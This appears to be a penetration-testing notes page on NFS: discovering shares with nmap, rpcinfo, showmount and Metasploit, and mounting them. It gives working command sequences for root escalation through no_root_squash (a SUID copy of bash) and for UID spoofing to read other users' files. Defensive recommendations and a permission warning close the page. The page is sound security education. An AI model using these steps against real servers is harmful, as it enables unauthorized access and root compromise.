---
title: "NFS Exports"
description: "Techniques and tools to discover, enumerate, and assess Network File System (NFS) shares."
tags:
  - enumeration
  - nfs
  - footprinting
  - reconnaissance
  - showmount
  - rpcinfo
icon: material/folder-network
---

# 📁 NFS Footprinting

**NFS** (Network File System) allows a user on a client computer to access files over a computer network much like local storage is accessed. Misconfigured NFS shares (such as those lacking authentication or using `no_root_squash`) are a classic and highly effective vector for initial access or privilege escalation.

---

## 1️⃣ Service Discovery & Port Identification

NFS relies heavily on **RPC (Remote Procedure Call)**. Before connecting to an NFS server, clients often query the `portmapper` or `rpcbind` service to find out which port NFS is listening on.

### Key Ports

- **TCP/UDP 111**: `rpcbind` / `portmapper`.
- **TCP/UDP 2049**: NFS service itself.
- **Dynamic Ports**: `mountd`, `nlockmgr`, `status` (often dynamically assigned, mapped via `rpcbind`).

### Nmap Discovery
```bash
# Scan common NFS and RPC ports, and run default scripts
nmap -sV -p 111,2049 --script nfs-ls,nfs-showmount,nfs-statfs <target>
```

### Checking RPC Services
To see exactly which services and versions are registered with RPC, use `rpcinfo`:
```bash
rpcinfo -p <target>
```
Look for `nfs` (usually port 2049) and `mountd`. If `nfs` is running but `mountd` is blocked by a firewall, you won't be able to mount shares.

---

## 2️⃣ Enumerating Exposed Shares

Once you confirm NFS is running, the next step is to identify which shares are exported and who is allowed to mount them.

### Using `showmount`

The most common tool for listing NFS exports:

```bash
# Show the NFS server's export list
showmount -e <target>
```
*Expected Output:*
```text
Export list for 10.10.10.10:
/home/ubuntu *
/opt/data    192.168.1.0/24
/var/backups (everyone)
```

- `*` or `(everyone)` indicates the share is open to any IP address.
- A specific subnet (e.g., `192.168.1.0/24`) means you must be on that network (or spoof an IP/pivot) to mount it.

### Using Metasploit
```bash
msfconsole -q -x "use auxiliary/scanner/nfs/nfsmount; set RHOSTS <target>; run"
```

---

## 3️⃣ Mounting NFS Shares

If a share is accessible to your IP, you can mount it to your local file system to browse its contents.

### Step-by-Step Mounting
```bash
# 1. Create a local mount point
mkdir /tmp/nfs_mount

# 2. Mount the remote share
# Use -o nolock to disable file locking, which is often required for older/misconfigured servers
sudo mount -t nfs <target>:/home/ubuntu /tmp/nfs_mount -o nolock

# 3. Explore the share
cd /tmp/nfs_mount
ls -la
```

### Unmounting
When you are finished, unmount the share to cleanly detach:
```bash
sudo umount /tmp/nfs_mount
```

---

## 4️⃣ Misconfigurations & Exploitation (`no_root_squash`)

By default, NFS maps requests from the `root` user on the client to an unprivileged user (usually `nobody` or `nfsnobody`) on the server. This security feature is called **root squashing**.

However, if a share is exported with the **`no_root_squash`** option, the server *trusts* the client's root user. Any file created by `root` on the client will be owned by `root` on the server.

### Exploiting `no_root_squash` for Privilege Escalation
If you have low-level shell access to the server (e.g., via SSH or a web shell) and notice a local directory is exported via NFS with `no_root_squash`:

1. **On your attacker machine** (running as root), mount the share:
   ```bash
   sudo mount -t nfs <target>:/exported_dir /tmp/nfs_mount
   ```
2. **Copy a shell binary** (like bash or a custom C payload) into the mounted share:
   ```bash
   cp /bin/bash /tmp/nfs_mount/rootbash
   ```
3. **Set the SUID bit** and ensure it's owned by root (since you are root on your attacker machine, the server will honor this):
   ```bash
   sudo chown root:root /tmp/nfs_mount/rootbash
   sudo chmod +s /tmp/nfs_mount/rootbash
   ```
4. **On the target machine** (as your low-privileged user), execute the SUID binary:
   ```bash
   /exported_dir/rootbash -p
   ```
   *You now have a root shell.*

---

## 5️⃣ UID/GID Manipulation

NFS relies on the **UID (User ID)** and **GID (Group ID)** of the client system. It does not authenticate by username. 

If a share allows read/write access but files are owned by `UID 1001`, you can access them by simply creating a local user with `UID 1001` on your attacker machine.

### Spoofing a UID
```bash
# Create a local user with the matching UID
sudo useradd -u 1001 nfshacker

# Switch to that user
su - nfshacker

# Access the mounted share
cd /tmp/nfs_mount
```

---

## 6️⃣ Defensive Recommendations (Quick Checklist)

- **Do not expose NFS to the Internet:** Bind NFS exclusively to internal networks. Use firewalls to drop port 111 and 2049 from untrusted IPs.
- **Avoid `no_root_squash`:** Never use this option unless absolutely necessary. Rely on `root_squash` or `all_squash`.
- **Restrict Exports by IP:** Explicitly list the IP addresses or subnets allowed to mount the share in `/etc/exports` instead of using `*`.
- **Use NFSv4 with Kerberos:** Upgrade to NFS version 4 and enforce Kerberos authentication (`sec=krb5p`) to encrypt traffic and require actual user authentication, mitigating UID spoofing.
- **Mount Options:** Use `nosuid` and `noexec` on the client side if the share is only meant for static data storage.

---

## 7️⃣ References & Further Reading

- HackTricks - NFS Pentesting: https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting
- Red Hat NFS Security: https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8/html/managing_file_systems/exporting-nfs-shares_managing-file-systems
- Nmap NFS Scripts: https://nmap.org/nsedoc/scripts/nfs-showmount.html


!!! warning
      **All commands should be executed only against systems you own or have explicit permission to test. Unauthorized probing or mounting of NFS shares is illegal and may trigger security alerts.**
